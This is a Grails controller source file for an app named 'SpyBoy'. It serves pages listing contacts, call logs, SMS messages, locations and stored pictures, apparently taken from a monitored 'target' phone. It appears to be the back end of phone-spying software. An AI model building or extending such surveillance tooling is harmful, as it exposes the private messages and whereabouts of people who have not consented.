package com.xaviar

import grails.converters.JSON;

import com.xaviar.domain.CallLog
import com.xaviar.domain.Contact
import com.xaviar.domain.FileData;
import com.xaviar.domain.Location
import com.xaviar.domain.Sms

class SpyBoyController {

	def redisService
	def contactService
	def locationService
	def smsService
	def userService
	def callLogService
	def phoneEventService
	def smsEventService
	def phoneParamsService

	def index() {
	}

	def callLog(){
		//Set<String> subscribers = userService.getUserInfo("token123");
		//UMetaData  uMetaData = new UMetaData();
		//uMetaData.setSimSubscriberId(subscriberId);
		//uMetaData.setToken("token123");
		//def callLogs = CallLog.findByTargetPhone(subscriberId);//callLogService.readAll(uMetaData);
		//params.max = Math.min(params.max ? params.int('max') : 10, 100)
		String number = params.number;
		def callLogs=null;
		if(number!=null){
			number = formatNumberForSQL(number);
			println (number);
			callLogs = CallLog.findAllByPhoneNumberLike("%" + number,[sort:"timeSeconds",order:"desc"]);
		}
		render(template:"callLog",model:[callLogInstanceList:callLogs, callLogsInstanceTotal: callLogs!=null ? callLogs.size():0]);
	}


	def about(){
	}

	def contacts(){
		params.max = Math.min(params.max ? params.int('max') : 50, 100)
		render(template:"contacts",model:[contactInstanceList: Contact.list(sort:"name",order:"desc"), contactInstanceTotal: Contact.count()]);
		//render(template:"contacts",model:[contactInstanceList: Contact.findAllByNumberLike("%524478017",[sort:"name",order:"desc"]), contactInstanceTotal: Contact.count()]);
	}


	def sms(){
		//params.max = Math.min(params.max ? params.int('max') : 50, 100)
		//default sms of first contact		
		String number = params.number;
		def smss=null;
		if(number!=null){
			number = formatNumberForSQL(number);
			println (number);
			smss = Sms.findAllByAddressLike("%" + number,[sort:"time",order:"asc"]);
		}
		render(template:"sms",model:[smsInstanceList: smss, smsInstanceTotal: smss!=null ? smss.size():0]);
		//Set<String> subscribers = userService.getUserInfo("token123");
		//		UMetaData  uMetaData = new UMetaData(subscriberId,"token123");
		//
		//		def smses = smsService.readAll(uMetaData);
		//
		//		if(!smses.isEmpty()){
		//			params.max = Math.min(max ?: 10, 100)
		//			int startOffset = params.get("offset")!=null ? Integer.parseInt(params.get("offset")) : 0 ;
		//			int toElement=10;
		//			if(max!=null){
		//				toElement = (startOffset + max) > smses.size() ? smses.size() : startOffset + max;
		//			}
		//			[smsInstanceList: smses.subList(startOffset,toElement), smsInstanceTotal: smses.size()]
		//		}else{
		//			[smsInstanceList: null, smsInstanceTotal: 0]
		//		}
	}

	private String formatNumberForSQL(String number) {
		if(number.length()>8){
			if(number.find("[-]")){
				number = number.replace('-','');
				number = Long.parseLong(number).toString();
			}	
//			if(!number.find("[#*+-]")){
//				number = Long.parseLong(number).toString();
//			}else if (number.find("[+]")){
//				number = number.replace("+972","");
//				number = Long.parseLong(number).toString();
//			}else if(number.find("[-]")){
//				number = number.replace('-','');
//				number = Long.parseLong(number).toString();
//			}
		}
		return number
	}


	def icons(){
	}

	def location(){
		List locations = Location.list(sort:"time");
		[locationInstanceList:locations as JSON,locationInstanceTotal: Location.count()];
	}
	
	
	def getImageBytes() {
		println (params.picname);
		FileData pic = FileData.findByNameLike("%" + params.picname +"%");
		if(pic!=null){
			response.getOutputStream().write(pic.decodedPic);
			response.getOutputStream().flush();
		}else{
			def baseFolder = grailsAttributes.getApplicationContext().getResource("/").getFile().toString()
			def imagesFolder = baseFolder + '/images/'			
			println (imagesFolder);
			File file = new File(imagesFolder+"happy-clients-01.jpg");
			response.contentType = "image/jpeg";
			response.getOutputStream().write(file.bytes);
			response.outputStream.flush();		
		}
	}	
}